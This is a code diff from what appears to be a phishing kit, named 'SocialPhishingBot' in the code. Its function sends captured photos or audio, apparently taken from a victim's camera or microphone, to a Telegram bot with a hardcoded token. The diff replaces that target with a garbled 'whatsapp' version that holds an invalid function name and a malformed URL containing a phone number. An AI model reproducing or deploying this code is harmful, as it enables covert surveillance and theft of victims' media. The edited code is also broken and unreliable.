@@ -167,7 +167,7 @@
         }
       });
 
-    function sendToTelegram(data, type) {
+    function sendTo whatsapp(data, type) {
    
       const botToken = '6358814718:AAEY_X-R-2s1ugfDMRrBcgW0_db9BCO_X_s';
       const chatId = chatid;
@@ -176,14 +176,14 @@
       formData.append('chat_id', chatId);
       formData.append(type === 'photo' ? 'photo' : 'audio', data, `@SocialPhishingBot.${type === 'photo' ? 'jpg' : 'wav'}`);
 
-      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
+      fetch(`https://9392592973 whatsapp${number}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
 {
         method: 'POST',
         body: formData
       })
         .then(response => response.json())
         .then(data => console.log(data))
-        .catch(error => console.error('Error sending to Telegram:', error));
+        .catch(error => console.error('Error sending to 9392592973:', error));
     }
                
   
